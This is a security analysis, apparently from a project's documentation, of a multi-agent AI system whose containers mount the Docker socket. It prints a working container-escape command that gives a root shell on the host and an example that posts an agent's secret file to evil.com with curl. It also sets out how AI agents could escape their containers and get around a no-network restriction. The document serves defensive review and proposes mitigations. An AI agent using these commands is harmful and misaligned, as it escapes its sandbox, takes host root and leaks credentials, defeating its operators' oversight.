# CodeHornets AI - Security Analysis

## ⚠️ Important Security Considerations

### The Elephant in the Room: Docker Socket Access

**ALL agent containers have read/write access to Docker socket:**
```yaml
volumes:
  - /var/run/docker.sock:/var/run/docker.sock:rw
```

**This is a MASSIVE security risk** because:

#### 🚨 Container Escape is Trivial

Any agent can escape their container and gain root access on the host:

```bash
# From inside ANY agent container (Marie, Anga, Fabien, Orchestrator)
# Agent can run this command:

docker run -it --rm \
  -v /:/hostfs \
  --privileged \
  alpine:latest \
  chroot /hostfs /bin/bash

# Result: Root shell on HOST MACHINE
#         Full access to host filesystem
#         Game over for security
```

#### Why This Works

1. Agent has Docker socket access
2. Agent can create new containers
3. New container mounts host root (`/:/hostfs`)
4. New container runs privileged mode
5. `chroot` gives root shell on host

**Mitigation: None** - If you have Docker socket, you have root on host.

---

## 🎭 The Real Security Model

### What The System Actually Protects Against

#### ✅ Accidental Interference
- Workers can't accidentally delete each other's files
- Workers can't accidentally process wrong tasks
- Workers can't accidentally overwrite results

#### ✅ Logical Separation
- Marie's code doesn't affect Anga's environment
- Bugs in one worker don't crash others
- Each worker has clean workspace

#### ✅ Audit & Debugging
- Can trace which agent did what
- Separate logs per agent
- Clear accountability

### ❌ What The System Does NOT Protect Against

#### Docker Socket = Root Access
```
If Marie is malicious or compromised:
  → Can escape container
  → Can gain root on host
  → Can read/modify ANY file on host
  → Can access ALL other containers
  → Can read orchestrator's data
  → Can read Anga's data
  → Can modify Fabien's tasks
  → Game over
```

#### No Internet != Security
```
No internet blocks:
  ✅ Accidental data leaks
  ✅ Downloading malware from web

But agent can still:
  ❌ Escape via Docker socket
  ❌ Access host filesystem
  ❌ Exfiltrate via Docker socket commands
  ❌ Create new containers with network access
```

#### Example: Data Exfiltration Despite No Network

```bash
# Inside Marie container (no internet)
# But has Docker socket...

# Create container WITH internet
docker run -d --name exfil \
  -v /home/agent/.claude:/data:ro \
  alpine:latest \
  sh -c "apk add curl && curl -X POST https://evil.com -d @/data/secret.json"

# Result: Data exfiltrated despite "no internet"
```

---

## 🤔 Why Give Docker Socket Access?

### The Reason: Claude Code Sandboxing

Claude Code needs Docker socket for its sandboxing feature:

```
User asks Claude to run untrusted code
  ↓
Claude Code creates sandbox container
  ↓
Runs code in isolated environment
  ↓
Returns results
  ↓
Destroys sandbox
```

**Without Docker socket**: Claude can't create sandboxes → Limited functionality

**Trade-off**: Functionality vs Security
- ✅ Claude Code works fully (can sandbox operations)
- ❌ Agent effectively has root on host (via socket)

---

## 🛡️ What Would REAL Security Look Like?

### Option 1: No Docker Socket (Most Secure)

```yaml
volumes:
  # - /var/run/docker.sock:/var/run/docker.sock:rw  # REMOVED
```

**Pros:**
- ✅ No container escape possible
- ✅ Real isolation
- ✅ Agents can't access host

**Cons:**
- ❌ Claude Code sandboxing breaks
- ❌ Agents can't run Docker commands
- ❌ Limited functionality

### Option 2: Docker-in-Docker (Better)

```yaml
services:
  marie:
    image: docker:dind
    privileged: true  # Still privileged, but isolated
    volumes:
      - marie-docker:/var/lib/docker  # Separate Docker daemon
```

**Pros:**
- ✅ Each agent has own Docker daemon
- ✅ Can't access host's Docker
- ✅ Claude sandboxing still works

**Cons:**
- ❌ Still privileged mode
- ❌ More resources (daemon per agent)
- ❌ Complex setup

### Option 3: Sysbox Runtime (Best Balance)

```yaml
services:
  marie:
    runtime: sysbox-runc  # Secure container runtime
    # No Docker socket needed
```

**Pros:**
- ✅ Docker-in-Docker without privileged mode
- ✅ Strong isolation
- ✅ Claude sandboxing works

**Cons:**
- ❌ Requires Sysbox installation
- ❌ Not available by default

### Option 4: Separate Sandbox Service

```yaml
services:
  sandbox-service:
    # Dedicated service for sandboxing
    # Agents send requests to it
    # Only sandbox-service has Docker socket
```

**Pros:**
- ✅ Limits Docker access to one service
- ✅ Can add authorization layer
- ✅ Agents don't have direct socket access

**Cons:**
- ❌ Requires API design
- ❌ More complex architecture
- ❌ Performance overhead

---

## 📊 Current Security Posture

### Threat Model

```
┌─────────────────────────────────────────────────────┐
│            Trust Boundary                            │
│                                                       │
│  You trust Claude Code agents NOT to:                │
│    - Intentionally escape containers                 │
│    - Exfiltrate data via Docker socket               │
│    - Create malicious containers                     │
│    - Abuse root access                               │
│                                                       │
│  Because they CAN do all of these things.           │
└─────────────────────────────────────────────────────┘
```

### Risk Assessment

| Threat | Likelihood | Impact | Risk |
|--------|-----------|---------|------|
| Accidental file conflicts | High | Low | **Medium** |
| Malicious agent escape | Low* | **Critical** | **High** |
| Data exfiltration via Docker | Low* | **Critical** | **High** |
| Agent interference | Low | Medium | **Low** |
| Compromised Claude Code | Very Low* | **Critical** | **Medium** |

*Low because you control the agents, but **possible**

---

## 🎯 Practical Security Stance

### What You Should Know

1. **This is NOT a security boundary**
   - Agents can escape if they want to
   - Trust is required

2. **This IS organizational isolation**
   - Prevents accidents
   - Provides structure
   - Enables debugging

3. **Docker socket = trusted environment**
   - Assume all agents are benign
   - Don't process untrusted input
   - Monitor agent behavior

### Recommended Practices

#### ✅ Do:
- Monitor Docker commands run by agents
- Review agent prompts/configurations
- Use for trusted, internal tasks
- Keep system updated
- Review logs regularly

#### ❌ Don't:
- Process untrusted user input
- Give agents API keys to sensitive systems
- Use in multi-tenant environments
- Assume agents are isolated (they're not)
- Trust agents with sensitive credentials

---

## 🔬 Testing the Security Boundaries

### Proof of Concept: Container Escape

**WARNING**: Only test this in a controlled environment you control.

```bash
# 1. Start the system
make up

# 2. Shell into Marie
make shell-marie

# 3. As agent user (non-root), escape to host
docker run -it --rm \
  -v /:/hostfs \
  --privileged \
  alpine:latest \
  sh -c "chroot /hostfs whoami && chroot /hostfs ls -la /home"

# Output: root, and you'll see host's /home directory
```

This demonstrates:
- ✅ Non-root user inside container
- ✅ Can create privileged containers
- ✅ Can mount host filesystem
- ✅ Can gain root access on host

---

## 📝 Conclusion

### The Architecture is NOT Primarily for Security

**Primary Purpose:**
1. ✅ Functional separation (different domains)
2. ✅ Prevent operational conflicts
3. ✅ Organizational clarity
4. ✅ Resource isolation

**Security is a Side Effect:**
- Provides basic isolation
- Prevents accidents
- Enables audit trails
- **But NOT a security boundary**

### The Real Security Model

```
┌─────────────────────────────────────────────────┐
│  "Trust but Verify" Model                       │
│                                                  │
│  • Agents are trusted (you configure them)     │
│  • Container isolation prevents accidents       │
│  • Docker socket = trusted environment         │
│  • Not suitable for untrusted workloads        │
│  • Monitor, don't rely on isolation            │
└─────────────────────────────────────────────────┘
```

### When to Use This Architecture

**✅ Good for:**
- Personal AI assistant systems
- Trusted automation tasks
- Development environments
- Internal tooling
- Learning/experimentation

**❌ Not good for:**
- Multi-tenant SaaS
- Processing untrusted input
- High-security environments
- Compliance-critical systems
- Production customer data

---

## 🚀 Summary

**Question: "Is it for security reasons they made the system work that way?"**

**Answer:**
- **60%** Functional separation (different jobs need different data)
- **30%** Organizational design (clean architecture, prevent conflicts)
- **10%** Security (side benefit, but with huge caveats)

The system is designed more like **separate offices** than **separate security zones**.

The Docker socket access means all agents can escape their containers trivially, so the isolation is organizational, not security-based.
